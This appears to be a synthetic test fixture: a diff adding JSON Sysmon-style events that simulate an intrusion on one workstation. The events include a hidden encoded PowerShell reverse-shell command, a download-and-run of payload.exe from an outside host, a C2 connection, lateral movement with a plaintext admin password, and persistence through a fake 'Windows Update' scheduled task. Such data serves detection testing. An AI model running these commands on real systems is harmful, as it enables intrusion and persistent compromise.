@@ -1,0 +1,81 @@
+[
+  {
+    "EventData": {
+      "UtcTime": "2024-03-15T02:13:44",
+      "Computer": "WORKSTATION-01",
+      "User": "CORP\\jsmith",
+      "EventID": "1",
+      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "CommandLine": "powershell.exe -NoP -NonI -W Hidden -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADUAMAAuADIAMAAwACIALAA0ADQANAAzACkA",
+      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+      "Hashes": "MD5=A1B2C3D4E5F6A7B8C9D0E1F2A3B4C5D6",
+      "TargetFilename": ""
+    }
+  },
+  {
+    "EventData": {
+      "UtcTime": "2024-03-15T02:14:02",
+      "Computer": "WORKSTATION-01",
+      "User": "CORP\\jsmith",
+      "EventID": "1",
+      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "CommandLine": "powershell.exe -Command \"[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; $wc = New-Object System.Net.WebClient; $wc.DownloadFile('http://198.51.100.44/tools/payload.exe', 'C:\\Users\\Public\\payload.exe'); Start-Process 'C:\\Users\\Public\\payload.exe'\"",
+      "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "Hashes": "MD5=DEADBEEFDEADBEEFDEADBEEFDEADBEEF",
+      "TargetFilename": ""
+    }
+  },
+  {
+    "EventData": {
+      "UtcTime": "2024-03-15T02:14:45",
+      "Computer": "WORKSTATION-01",
+      "User": "CORP\\jsmith",
+      "EventID": "3",
+      "Image": "C:\\Users\\Public\\payload.exe",
+      "CommandLine": "",
+      "SourceIp": "10.0.1.50",
+      "SourcePort": "52341",
+      "DestinationIp": "198.51.100.44",
+      "DestinationPort": "443",
+      "DestinationHostname": "c2.evil-domain.xyz",
+      "Protocol": "tcp",
+      "Hashes": ""
+    }
+  },
+  {
+    "EventData": {
+      "UtcTime": "2024-03-15T02:15:10",
+      "Computer": "WORKSTATION-01",
+      "User": "CORP\\jsmith",
+      "EventID": "1",
+      "Image": "C:\\Windows\\System32\\net.exe",
+      "CommandLine": "net use \\\\10.0.1.100\\admin$ /user:CORP\\administrator P@ssw0rd123",
+      "ParentImage": "C:\\Users\\Public\\payload.exe",
+      "Hashes": ""
+    }
+  },
+  {
+    "EventData": {
+      "UtcTime": "2024-03-15T02:16:00",
+      "Computer": "WORKSTATION-01",
+      "User": "CORP\\jsmith",
+      "EventID": "1",
+      "Image": "C:\\Windows\\System32\\schtasks.exe",
+      "CommandLine": "schtasks /create /sc minute /mo 5 /tn \"Windows Update\" /tr \"C:\\Users\\Public\\payload.exe\" /ru SYSTEM",
+      "ParentImage": "C:\\Users\\Public\\payload.exe",
+      "Hashes": ""
+    }
+  },
+  {
+    "EventData": {
+      "UtcTime": "2024-03-15T02:17:30",
+      "Computer": "WORKSTATION-01",
+      "User": "CORP\\jsmith",
+      "EventID": "1",
+      "Image": "C:\\Windows\\System32\\whoami.exe",
+      "CommandLine": "whoami /all",
+      "ParentImage": "C:\\Users\\Public\\payload.exe",
+      "Hashes": ""
+    }
+  }
+]
